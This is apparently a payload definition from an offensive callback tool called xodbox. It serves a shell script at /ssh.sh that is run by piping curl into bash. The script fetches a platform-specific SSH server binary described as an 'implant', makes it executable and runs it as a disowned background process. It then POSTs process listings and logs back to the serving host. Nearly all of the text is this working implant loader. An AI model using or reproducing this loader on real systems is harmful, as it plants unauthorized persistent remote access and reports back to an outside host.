---
title: Simple SSH
description: Simple SSH (requires build of simple ssh server in static dir)
weight: 1
pattern: /ssh.sh$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    CMD=ss
    DEST_FILE=/tmp/$CMD
    killall $CMD
    OS=$(uname)
    ARCH=$(uname -m)
    curl {{.Request.Host}}/mdaas/$OS/$ARCH/simple-ssh > $DEST_FILE
    chmod +x $DEST_FILE
    bash -c "$DEST_FILE > $DEST_FILE.log 2>&1 &" &
    r=$(ps aux | grep $CMD ;cat $DEST_FILE.log; ls -lah "$DEST_FILE"*)
    disown

    echo $r
    curl "{{.Request.Host}}/{{ .NotifyString }}/res/" --data "$r" -X POST
---

Build an SSH server implant for the specific platform and execute it.

### Example Request

```bash
curl xodbox/ssh.sh|bash
```